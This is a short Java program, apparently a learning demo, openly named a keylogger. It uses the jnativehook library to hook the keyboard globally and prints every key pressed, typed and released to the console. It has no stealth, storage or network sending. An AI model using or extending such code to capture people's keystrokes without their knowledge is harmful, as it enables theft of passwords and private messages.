
package KeyLoger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLoger implements NativeKeyListener {
    
    public static void main(String[] args) {
        
        try{
            GlobalScreen.registerNativeHook();
            
        }catch(NativeHookException ex){
            System.out.println(ex);
        }
       GlobalScreen.addNativeKeyListener(new KeyLoger());
        
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
       if(nke.getKeyCode()== NativeKeyEvent.VC_SPACE){
            System.out.println(" ");
        }
        else if(nke.getKeyCode()== NativeKeyEvent.VC_ENTER){
            System.out.println();
        }
        else
        {
           System.out.println(NativeKeyEvent.getKeyText(nke.getKeyCode())); 
        }
        
        
        
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nke) {
        
          System.out.println("Pressed: " + NativeKeyEvent.getKeyText(nke.getKeyCode()));
        
        if(nke.getKeyCode()== NativeKeyEvent.VC_SPACE){
            System.out.println(" ");
        }
        else if(nke.getKeyCode()== NativeKeyEvent.VC_ENTER){
            System.out.println();
        }
        else
        {
           System.out.println(NativeKeyEvent.getKeyText(nke.getKeyCode())); 
        }
        
        
       
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
       System.out.println("Released: " + NativeKeyEvent.getKeyText(nke.getKeyCode())); 
    }
}
